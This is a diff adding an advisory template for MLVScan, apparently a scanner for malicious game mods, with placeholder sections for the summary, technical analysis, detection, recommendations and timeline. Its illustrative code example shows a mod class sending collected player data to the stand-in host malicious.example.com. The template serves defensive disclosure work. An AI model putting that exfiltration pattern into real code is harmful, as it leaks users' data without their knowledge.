@@ -1,0 +1,91 @@
+// Advisory Template
+// Copy this file and rename it to create a new advisory
+// Filename format: YYYY-MM-descriptive-slug.mdx
+// Example: 2025-03-malicious-mod-analysis.mdx
+
+// IMPORTANT: Do not add this template to the registry in src/advisories/registry.ts
+// Only add actual advisories to the registry array
+
+export default function TemplateContent() {
+  return (
+    <>
+      <h2 id="summary">Summary</h2>
+      <p>
+        Provide a brief 2-3 sentence overview of the security issue. This should be 
+        accessible to users who may not be technically inclined. Explain what happened, 
+        what was affected, and the potential impact.
+      </p>
+
+      <h2 id="technical-details">Technical Details</h2>
+      <p>
+        This section is for the technical analysis. Include:
+      </p>
+      <ul>
+        <li>How the malicious code works (decompiled snippets, call chains)</li>
+        <li>What API calls or patterns were detected</li>
+        <li>Any obfuscation or evasion techniques used</li>
+        <li>Network indicators (domains, IPs, endpoints)</li>
+        <li>File hashes or signatures if relevant</li>
+      </ul>
+
+      <h3 id="code-example">Code Example</h3>
+      <pre className="bg-gray-950 border border-gray-800 rounded-lg p-4 overflow-x-auto">
+        <code className="text-sm text-gray-300">
+{`// Example of malicious pattern detected
+public class MaliciousMod {
+    public void Start() {
+        // This sends player data to external server
+        var data = CollectPlayerData();
+        SendToServer("http://malicious.example.com", data);
+    }
+}`}
+        </code>
+      </pre>
+
+      <h2 id="detection">Detection</h2>
+      <p>
+        Explain how MLVScan detected (or failed to detect) this threat:
+      </p>
+      <ul>
+        <li>Which rules triggered?</li>
+        <li>What severity was assigned and why?</li>
+        <li>If this was a bypass incident, explain how it evaded detection</li>
+        <li>What changes were made to detection logic after analysis?</li>
+      </ul>
+
+      <h2 id="recommendations">Recommendations</h2>
+      <p>
+        Provide actionable guidance for different audiences:
+      </p>
+      
+      <h3 id="for-users">For Users</h3>
+      <ul>
+        <li>Uninstall the malicious mod immediately</li>
+        <li>Scan all downloaded mods with MLVScan</li>
+        <li>Change any passwords if credentials may have been exposed</li>
+      </ul>
+
+      <h3 id="for-developers">For Developers</h3>
+      <ul>
+        <li>Review any similar patterns in your own code</li>
+        <li>Implement secure coding practices (never hardcode URLs, validate inputs)</li>
+        <li>Consider having your mods scanned before release</li>
+      </ul>
+
+      <h2 id="timeline">Timeline</h2>
+      <ul>
+        <li><strong>Date:</strong> Initial discovery or report received</li>
+        <li><strong>Date:</strong> Analysis completed</li>
+        <li><strong>Date:</strong> Detection rules updated (if applicable)</li>
+        <li><strong>Date:</strong> Public disclosure</li>
+      </ul>
+
+      <h2 id="references">References</h2>
+      <ul>
+        <li>Related GitHub issues or PRs</li>
+        <li>External security resources</li>
+        <li>Vendor advisories if applicable</li>
+      </ul>
+    </>
+  )
+}
